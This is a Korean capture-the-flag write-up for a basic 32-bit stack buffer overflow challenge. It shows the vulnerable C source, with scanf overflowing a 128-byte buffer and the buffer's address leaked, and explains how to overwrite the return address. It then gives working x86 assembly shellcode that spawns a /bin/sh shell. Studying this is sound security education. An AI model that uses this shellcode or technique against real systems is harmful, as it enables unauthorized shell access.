# 문제 풀이 방법

```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();

    printf("buf = (%p)\n", buf);
    scanf("%141s", buf);

    return 0;
}
```
위 코드를 보면 `initialize()` 함수에서 `SIGALRM`을 발생시키고 30초가 지나면 `alarm_handler` 함수가 수행되어 `exit(-1);`에 의해 프로그램이 종료된다.  
따라서 30초가 넘어가기 전에 해당 프로그램을 익스플로잇하여 쉘코드를 실행해야한다.

이 문제에서는 scanf 함수의 취약점을 통해 익스플로잇 할 수 있다. buf의 크기는 0x80(128)인데 141 바이트 크기의 string을 입력받고 있기 때문에, `sfp`와 `return address`를 덮어쓸 수 있다.  
해당 코드에서 `printf("buf = (%p)\n", buf);`를 통해 buf의 주소를 print해주는데,

1. buffer의 주소를 return address에 넣고
2. buffer에는 쉘코드를 삽입하면 쉘을 얻을 수 있다.

# 쉘코드 작성

우리가 작성하고자 하는 쉘 코드는 `execve('bin/sh', 0, 0);`을 실행하여 쉘을 얻는 코드이다. 내용은 아래와 같다.

참고로 문제의 해당 실행 환경이 **i386(x86)** 이므로 32bit에 맞춰 어셈블리 코드를 작성해야한다. 
```
section .text
global _start

_start:
    xor eax,eax       ; 뒤에서 execve() 콜을 위해 eax를 0으로 초기화해주는 부분 (대부분 0이 들어있기 때문에 필수적이지는 않지만 권장)
    push 0x68732f     ; == push 0x0068732f
    push 0x6e69622f   ; should not end with 0x00 ex) push 0x69622f
    mov ebx, esp      ; arg0 : ebx = 'bin/sh'
    xor ecx, ecx      ; arg1 : ecx = 0
    xor edx, edx      ; arg2 : edx = 0
    mov al, 0x8       ; mov eax, 0x8도 가능하지만, 더 효율적인 작업을 위해 al에 0x8 대입
    inc al            ; eax = 0x9
    inc al            ; eax = 0xa
    inc al            ; eax = 0xb
    int 0x80          ; execve call 발생
``` 
  

